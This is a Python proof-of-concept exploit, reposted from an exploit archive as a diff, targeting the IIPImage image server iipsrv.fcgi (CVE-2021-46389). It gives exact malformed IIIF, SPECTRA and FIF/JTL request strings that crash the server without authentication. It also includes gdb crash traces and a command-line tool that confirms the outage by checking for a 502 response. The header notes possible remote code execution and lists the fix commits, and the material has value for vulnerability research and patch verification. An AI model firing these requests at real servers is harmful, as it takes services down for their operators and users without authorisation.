@@ -1,0 +1,197 @@
+id: 37769
+date: 06/04/2022
+title: IIPImage Remote Memory Corruption Exploit
+author: Jeremy Brown
+cves: 
+
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
+#
+# thiel.py
+#
+# IIPImage Multiple Remote Memory Corruption Vulnerabilities
+#
+# Jeremy Brown [jbrown3264/gmail]
+#
+# IIPImage is distributed with a server that enables advanced, high-performance
+# image manipulation for web-based streaming and viewing of high resolution images.
+# The server component called iipsrv.fcgi processes requests from users and passes
+# them to command handlers. Several crashes including an integer overflow were
+# discovered by sending malformed requests to the server, allowing remote users
+# without authentication to perform denial-of-service attacks or potentially
+# crafted for remote code execution as the server's running user.
+#
+# Tested on Ubuntu 20.04 with NGINX fastcgi_pass localhost:9000 configuration
+#
+# Demo
+#
+# $ ./thiel.py http://10.0.0.201 --trigger iiif
+#
+# (gdb) r --bind 0.0.0.0:9000 # 9000 for nginx comms, port 80 externally
+# ...
+#
+# Thread 1 "iipsrv.fcgi" received signal SIGSEGV, Segmentation fault.
+# __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:319
+# (gdb) i r
+# rax            0x7ffef6d50b68      140733039577960
+# rbx            0xffffffff          4294967295
+# rcx            0xb3                179
+# rdx            0x6                 6
+# rsi            0x5555556ae20d      93824993649165
+# rdi            0x7ffef6d50b68      140733039577960
+# rbp            0x7fffffffc690      0x7fffffffc690
+# rsp            0x7fffffffc4b8      0x7fffffffc4b8
+# r8             0x0                 0
+# r9             0x0                 0
+# r10            0x55555564f4e0      93824993260768
+# r11            0x7ffef6d50b68      140733039577960
+# r12            0xb58               2904
+# r13            0x81                129
+# r14            0x1e4               484
+# r15            0x8                 8
+# rip            0x7ffff7a53708      0x7ffff7a53708 <__memmove_avx_unaligned_erms+152>
+#
+# => 0x7ffff7a53708 <__memmove_avx_unaligned_erms+152>:  mov    ecx,DWORD PTR [rsi+rdx*1-0x4]
+#
+# 0  __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:319
+# 1  0x0000555555573b5c in memcpy (__len=6, __src=<optimized out>, __dest=<optimized out>) at /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34
+# 2  TileManager::getRegion (this=this@entry=0x7fffffffc7d0, res=res@entry=0, seq=0, ang=90, layers=0, x=<optimized out>, y=<optimized out>, width=<optimized out>, height=<optimized out>) at TileManager.cc:470
+# 3  0x000055555558c914 in CVT::send (this=this@entry=0x7fffffffd390, session=session@entry=0x7fffffffd8b0) at CVT.cc:222
+# 4  0x000055555559a06e in IIIF::run (this=0x5555555e2e20, session=0x7fffffffd8b0, src=...) at IIIF.cc:656
+# 5  0x0000555555566cf4 in main (argc=<optimized out>, argv=<optimized out>) at Main.cc:741
+#
+# Fixes
+# - commits 4ed59265fbbd636dc2fbbf325f8ea37ed300a6d9, 882925b295a80ec992063deffc2a3b0d803c3195
+#
+# CVE-2021-46389
+#
+
+import os
+import sys
+import argparse
+import signal
+import requests
+
+PATH = '/fcgi-bin/iipsrv.fcgi'
+
+#
+# also there's many params for some functions like fif such as obj, qlt, sds,
+# cnt, cvt, wid, rgn, etc so the code definitely needs lots of input validation
+#
+QUERY_FIF = '?fif='
+QUERY_IIIF = '?iiif='
+QUERY_SPECTRA = '?spectra='
+
+#
+# Some bugs require a valid file (eg. tiled TIF) to be present on the server (eg. IIIF big region)
+#
+# sample: https://openslide.cs.cmu.edu/download/openslide-testdata/Generic-TIFF/CMU-1.tiff
+#
+VALID_FILE = '/var/www/test.tif'
+
+### BUGS ###
+#
+# Bug #1: Integer overflow @ TileManager::getRegion()
+#
+# Thread 1 "iipsrv.fcgi" received signal SIGSEGV, Segmentation fault.
+# __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:319
+#
+# REQ = QUERY_IIIF + VALID_FILE + '/full,32883,500,500/256,/0/default.jpg' # image
+# REQ = QUERY_IIIF + VALID_FILE + '/full,32884,500,500/256,/0/default.jpg' # image error
+REQ_IIIF = QUERY_IIIF + VALID_FILE + '/full,32912,500,500/256,/0/default.jpg' # SIGSEGV
+# REQ_FIF_WID = QUERY_FIF + VALID_FILE + '&wid=652455&cvt=jpeg' # SIGSEGV (starts at CVT::run instead of IIIF:run)
+
+#
+# Bug #2: NULL ptr deref @ SPECTRA::run
+#
+# Thread 1 "iipsrv.fcgi" received signal SIGSEGV, Segmentation fault.
+# SPECTRA::run (this=0x5555555e2f70, session=0x7fffffffd8b0, argument=...) at IIPImage.h:335
+# 335    unsigned int getTileWidth() { return tile_width; };
+#
+REQ_SPECTRA = QUERY_SPECTRA + 'x' # no valid file necessary
+
+#
+# Bug #3: Another crash @ JTL::run
+#
+# Thread 1 "iipsrv.fcgi" received signal SIGSEGV, Segmentation fault.
+# JTL::send (this=this@entry=0x5555555e3200, session=session@entry=0x7fffffffd8c0, resolution=resolution@entry=129165, tile=tile@entry=1) at IIPImage.h:324
+# 324    unsigned int getImageWidth( int n=0 ) { return image_widths[n]; };
+#
+REQ_FIF_JTL = QUERY_FIF + VALID_FILE + '&jtl=129500,1' # try larger value if no crash
+#
+### END BUGS ###
+
+
+class Thiel(object):
+    def __init__(self, args):
+        self.host = args.host
+        self.trigger = args.trigger
+
+    def run(self):
+        if(self.trigger == None):
+            print("error: choose which bug use via --trigger")
+            return -1
+
+        if(self.trigger == 'iiif'):
+            return self.sendRequest(self.host, REQ_IIIF)
+
+        if(self.trigger == 'spectra'):
+            return self.sendRequest(self.host, REQ_SPECTRA)
+
+        if(self.trigger == 'fif_jtl'):
+            return self.sendRequest(self.host, REQ_FIF_JTL)
+
+        return 0
+
+    def sendRequest(self, host, req):
+        session = requests.Session()
+
+        try:
+            resp = session.get(host + PATH + req)
+        except Exception as error:
+            print("Error: %s" % error)
+            return -1
+
+        if(b'502 Bad Gateway' in resp.content):
+            print("done\n")
+            return 0
+        else:
+            print("[-] iipsrv still appears to be up\n")
+            return -1
+
+def signalExit():
+    sys.exit(-1)
+
+def arg_parse():
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("host",
+                        type=str,
+                        help="target host")
+
+    parser.add_argument("--trigger",
+                        "--trigger",
+                        type=str,
+                        choices=['iiif', 'spectra', 'fif_jtl'],
+                        help="which bug to trigger")
+
+    args = parser.parse_args()
+
+    return args
+
+def main():
+    signal.signal(signal.SIGINT, signalExit)
+
+    args = arg_parse()
+
+    pt = Thiel(args)
+
+    result = pt.run()
+
+    if(result > 0):
+        sys.exit(-1)
+
+if(__name__ == '__main__'):
+    main()
+
+#  0day.today [2023-03-25]  #
